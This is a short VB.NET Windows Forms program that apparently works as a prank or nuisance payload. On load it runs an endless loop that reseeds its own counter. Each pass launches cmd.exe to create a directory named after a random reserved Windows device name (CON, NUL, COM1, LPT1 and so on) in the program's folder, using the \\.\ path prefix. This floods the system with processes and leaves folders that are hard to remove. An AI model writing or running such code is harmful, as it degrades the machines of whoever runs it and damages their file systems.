Public Class Form1
    Public s As New ArrayList

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Randomize()
        s.Add("CON")
        s.Add("PRN")
        s.Add("AUX")
        s.Add("NUL")
        s.Add("COM1")
        s.Add("COM2")
        s.Add("COM3")
        s.Add("COM4")
        s.Add("COM5")
        s.Add("COM6")
        s.Add("COM7")
        s.Add("COM8")
        s.Add("COM9")
        s.Add("LPT1")
        s.Add("LPT2")
        s.Add("LPT3")
        s.Add("LPT4")
        s.Add("LPT5")
        s.Add("LPT6")
        s.Add("LPT7")
        s.Add("LPT8")
        s.Add("LPT9")


        For i = 0 To 1
            banana()
            i = -1
        Next
    End Sub

    Private Sub banana() Handles Button1.Click
        TextBox1.Text = s.Item(Int(Rnd() * s.Count))
        'MsgBox(" /c md \\.\" & Application.StartupPath & "\" & TextBox1.Text)
        Process.Start("cmd.exe", " /c md \\.\" & Application.StartupPath & "\" & TextBox1.Text)
    End Sub
End Class
